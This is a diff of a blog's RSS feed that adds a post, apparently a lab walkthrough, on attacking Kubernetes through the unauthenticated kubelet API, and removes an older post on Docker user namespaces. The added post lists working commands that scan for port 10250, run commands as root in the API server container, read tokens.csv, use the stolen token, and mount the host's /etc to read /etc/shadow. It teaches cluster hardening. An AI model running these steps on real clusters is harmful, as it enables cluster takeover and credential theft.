@@ -7,6 +7,198 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Kubernetes - From Container to Cluster</title>
+				<description>&lt;p&gt;I’ve been reading up on Kubernetes a bit recently and &lt;a href=&quot;https://twitter.com/killahertz_&quot;&gt;Jesse Hertz&lt;/a&gt; pointed me at an interesting item around Kubernetes security that illustrates common problem of insecure defaults, so I thought it might be worth a post walking through the issue, mainly as a way for me to improve my Kubernetes knowledge but also could be useful for others who are deploying it.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;td;dr&lt;/strong&gt; if you can get access to the kubelet API port you can control the whole cluster and default configurations of Kubernetes are likely to make this possible, so be careful when setting up your clusters.&lt;/p&gt;
+
+&lt;p&gt;So the issue I wanted to look at is this &lt;a href=&quot;https://github.com/kayrus/kubelet-exploit&quot;&gt;kubelet exploit&lt;/a&gt;.  Basically the kubelet is the service which runs on Kubernetes nodes and manages things like the docker installation on that node amongst other things.  It receives commands from the API server which co-ordinates the actions of the nodes in the cluster.&lt;/p&gt;
+
+&lt;p&gt;The security problem lies in the fact that by default the kubelet service listens on a TCP/IP port with no authentication or authorization control, so anyone who can reach that port at a network level can execute kubelet commands just by issuing HTTP requests to the service.&lt;/p&gt;
+
+&lt;p&gt;This means that an attacker who can get access to that port can basically take over the whole cluster pretty easily.&lt;/p&gt;
+
+&lt;p&gt;The kubernetes team are well aware of this issue but a fix isn’t planned until &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11816&quot;&gt;Kubernetes 1.5&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s also a workaround mentioned on the kubelet-exploit page which involves binding the kubelet to 127.0.0.1 and then connecting it to the kube-apiserver via SSH tunnels.&lt;/p&gt;
+
+&lt;p&gt;To explore this problem I followed the &lt;a href=&quot;http://kubernetes.io/docs/getting-started-guides/kubeadm/&quot;&gt;kubeadm guide&lt;/a&gt; from the kubernetes site.  Kubeadm is a tool which allows for clusters to be easily set up and appears to somewhat be modeled after some of the docker swarm commands.&lt;/p&gt;
+
+&lt;p&gt;I followed the tutorial through to the point where I had a working cluster, taking all the defaults.&lt;/p&gt;
+
+&lt;p&gt;Then I deployed a container with some tools into the cluster, the scenario we’re testing is that an attacker has gained access to a container in the cluster, and we’ll see what they can do to take control of the cluster with only that access&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;which after a while for the image to download gives us a bash shell running in a container on the cluster.&lt;/p&gt;
+
+&lt;p&gt;So now we can scan round to see whether the port we’re looking for is available.&lt;/p&gt;
+
+&lt;p&gt;First add some tools to our build&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update
+apt install nmap curl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then scan the network. In this case my main network where the nodes are installed is 192.168.41.0/24&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -v -n -p10250 192.168.41.0/24
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;from that we get back a bunch of filtered ports but also three open ones which are the IP addresses of my kubernetes nodes.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 192.168.41.201
+Host is up (0.00013s latency).
+PORT      STATE SERVICE
+10250/tcp open  unknown
+
+Nmap scan report for 192.168.41.232
+Host is up (0.000065s latency).
+PORT      STATE SERVICE
+10250/tcp open  unknown
+
+Nmap scan report for 192.168.41.233
+Host is up (0.00020s latency).
+PORT      STATE SERVICE
+10250/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we can use some of the kubectl commands mentioned in the exploit to start getting more access to the cluster.  First up lets enumerate our containers&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This returns a list of the pods running on the node in JSON form, and also the images they’re based on.  The most interesting one here is&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;creationTimestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver-kube&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;namespace&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-system&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;uid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0446d05fb9406214210e8d29397f8bf2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;spec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;containers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/kube-apiserver-amd64:v1.4.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/pause-amd64:3.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;it’s running the kube-apiserver image, so that’ll be our API server.  As I mentioned earlier the API server is basically the heart of the cluster, so access to it provides a lot of control over the cluster itself.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ls -la /&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;lists the files in the root directory of that container and if we run&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=whoami&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We get back the answer that every pentester likes to see which is &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; !&lt;/p&gt;
+
+&lt;p&gt;So at this point, that’s pretty bad news for the cluster owner.  A rogue container should not be able to execute privileged commands on the API server of the cluster.&lt;/p&gt;
+
+&lt;p&gt;So the next step in the attack would be to take over the cluster, for which the easiest way is likely to be getting control of the API server, as that lets us create new containers amongst other things.&lt;/p&gt;
+
+&lt;p&gt;if we do&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ps -ef&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;we can see the process list for the API server which handily provides the path of the token file that Kubernetes uses to authenticate access to the API&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PID   USER     TIME   COMMAND
+    1 root       2:29 /usr/local/bin/kube-apiserver --v=4 --insecure-bind-address=127.0.0.1 --etcd-servers=http://127.0.0.1:2379 --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota --service-cluster-ip-range=100.64.0.0/12 --service-account-key-file=/etc/kubernetes/pki/apiserver-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --tls-cert-file=/etc/kubernetes/pki/apiserver.pem --tls-private-key-file=/etc/kubernetes/pki/apiserver-key.pem --token-auth-file=/etc/kubernetes/pki/tokens.csv --secure-port=443 --allow-privileged --etcd-servers=http://127.0.0.1:2379
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;here we can see that it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/kubernetes/pki/tokens.csv&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;so then we can just cat out that file&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=cat /etc/kubernetes/pki/tokens.csv&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;and we get the token which is the first field listed&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we can communicate directly with the Kubernetes API like so&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -X GET -H &quot;Authorization: Bearer d65ba5f070e714ab&quot; https://192.168.41.233
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;this gives us easier control of the cluster than we had from just running individual commands on it.&lt;/p&gt;
+
+&lt;p&gt;We could persist with the HTTP API but TBH I find it easier to use kubectl, so we can just download that and point it at our cluster with our newly acquired token.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
+chmod +x kubectl
+./kubectl config set-cluster test --server=https://192.168.41.233
+./kubectl config set-credentials cluster-admin --token=d65ba5f070e714ab
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;From here, the next step it to look at getting access to the underlying nodes.  This can be achieved by mapping in a volume from the node to a container that we run.&lt;/p&gt;
+
+&lt;p&gt;so if we create a file called test-pod.yml&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
+kind: Pod
+metadata:
+  name: test-pd
+spec:
+  containers:
+  - image: nginx
+    name: test-container
+    volumeMounts:
+    - mountPath: /test-pd
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      # directory location on host
+      path: /etc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;and start it up with &lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl create -f test-pod.yml&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;we can then run a command to cat out the /etc/shadow file of the underlying node&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/kubectl exec test-pd -c test-container cat /test-pd/shadow
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;From there it’s just a bit of password cracking needed and we get shell access to the underlying node.&lt;/p&gt;
+
+&lt;p&gt;So from that we can see that there’s definitely something to think about if you’re going to run a Kubernetes cluster in production, i.e. protect access to the kubectl API port…&lt;/p&gt;
+</description>
+				<pubDate>Sat, 08 Oct 2016 10:05:39 +0100</pubDate>
+				<link>/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</link>
+				<guid isPermaLink="true">/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</guid>
+			</item>
+		
+			<item>
 				<title>Docker 1.12 - Macvlan</title>
 				<description>&lt;p&gt;Another new cool facet of the 1.12 release of Docker Engine is that Macvlan and Ipvlan support is leaving experimental and is available for all users.  So now instead of the rather convoluted procedure I mentioned &lt;a href=&quot;https://raesene.github.io/blog/2016/02/07/Exploration-in-Docker-bridging/&quot;&gt;last time I looked at this&lt;/a&gt; we can now simplify the setup of containers attached to the same network as the host, removing the need for NAT translation from the container network to the host network.&lt;/p&gt;
 
@@ -458,72 +650,6 @@ sudo ip link &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;virtual0 netns 34
 				<pubDate>Sun, 07 Feb 2016 14:45:39 +0000</pubDate>
 				<link>/blog/2016/02/07/Exploration-in-Docker-bridging/</link>
 				<guid isPermaLink="true">/blog/2016/02/07/Exploration-in-Docker-bridging/</guid>
-			</item>
-		
-			<item>
-				<title>Docker 1.10 Notes - User Namespaces</title>
-				<description>&lt;p&gt;So Docker 1.10 has just landed and with it a number of great new security enhancements.  One of the main ones is the enabling of User Namespaces.  This adds an extra level of protection as processes running in a container as root will not be running as root on the host Operating System, which makes it harder for a rogue process to break out of the container.&lt;/p&gt;
-
-&lt;p&gt;When I downloaded 1.10 as an upgrade to an existing 1.9.1 install on Ubuntu, I noticed that User Namespaces don’t seem to be enabled by default, so I thought it would be worth noting how I enabled it as it’s a handy feature to be running.&lt;/p&gt;
-
-&lt;p&gt;To get this working on Ubuntu 15.10, which uses systemd, I did this&lt;/p&gt;
-
-&lt;p&gt;copy the base systemd config file to /etc/systemd/system&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo cp /lib/systemd/system/docker.service /etc/systemd/system/&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;It’s not likely to be a good idea to modify the one in /lib/systemd/system/ as it could be overwritten by later package downloads.&lt;/p&gt;
-
-&lt;p&gt;Once you’ve done that you need to tell docker to remap the userns.  This can be done to an explicitly chosen uid:gid, but the basic default option will probably work fine for a lot of use-cases.&lt;/p&gt;
-
-&lt;p&gt;So in /etc/systemd/system/docker you can edit&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ExecStart=/usr/bin/docker daemon -H fd://&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;to&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ExecStart=/usr/bin/docker daemon --userns-remap=default -H fd://&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;and then restart docker with&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo systemctl daemon-reload&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo systemctl restart docker&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Once you’ve done that you can check to make sure that it’s working by running a process in a container as root and look at what UID is being shown on the host.&lt;/p&gt;
-
-&lt;p&gt;So something like&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -it ubuntu:14.04 top&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;should run the top process as root in the container and you can then do ps -ef or similar on the host OS and check what UID is in use.  In my example if came out looking like&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;165536     2347   2323  0 21:20 pts/0    00:00:00 top&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;So, no longer running as root , yay!&lt;/p&gt;
-
-&lt;p&gt;One quick thing I noticed is that a side-effect of enabling userns-remap was that all my downloaded images were no longer visible, so I had to re-download the one’s I had.  So it’s defintely worth trying this change out on test systems before rolling out to production!&lt;/p&gt;
-
-&lt;p&gt;You can back up your existing images with something like&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker save&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;if needed and it’s also worth noting that if you disable userns again, your original images will be available.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt; I got a mail from &lt;a href=&quot;https://twitter.com/estesp&quot;&gt;Phil Estes&lt;/a&gt; who has some good additional info. about the reasons that images aren’t visible when you enable userns, which I thought would be good to add here in case anyone finds this blog about it before the other ones that Phil mentions below.&lt;/p&gt;
-
-&lt;p&gt;–&lt;/p&gt;
-
-&lt;p&gt;“This segregation of image &amp;amp; layer content separated by user/group mapping is required because of file ownership within these image layers. 
-If we tried to use the same layers in a remapped range environment it would nearly operate as a read-only environment, or worse, given the UIDs/GIDs used within your user namespaced process would have no write access to most directories and probably also not have read access to many as well due to permission bits in the original content.&lt;/p&gt;
-
-&lt;p&gt;So, instead of trying to do all kinds of funny “chown” tricks on use of the content (which would then need to be “chowned” back later in case you then run your daemon with different mappings or with user namespaces off), we basically create a new “root” cache that is empty when you start with a specific uid/gid mapping.  As you pull content it acts the same as any daemon and will be there for use when that mapping is enabled.  If you restart your daemon with user namespaces disabled, then all the prior content is there as you noted.&lt;/p&gt;
-
-&lt;p&gt;These details are also explained in &lt;a href=&quot;https://integratedcode.us/2015/10/13/user-namespaces-have-arrived-in-docker/&quot;&gt;my blog post&lt;/a&gt; on the topic as well as the &lt;a href=&quot;https://docs.docker.com/engine/reference/commandline/daemon/#daemon-user-namespace-options&quot;&gt;official documentation on user namespaces&lt;/a&gt;. “&lt;/p&gt;
-</description>
-				<pubDate>Thu, 04 Feb 2016 20:30:39 +0000</pubDate>
-				<link>/blog/2016/02/04/Docker-User-Namespaces/</link>
-				<guid isPermaLink="true">/blog/2016/02/04/Docker-User-Namespaces/</guid>
 			</item>
 		
 	</channel>
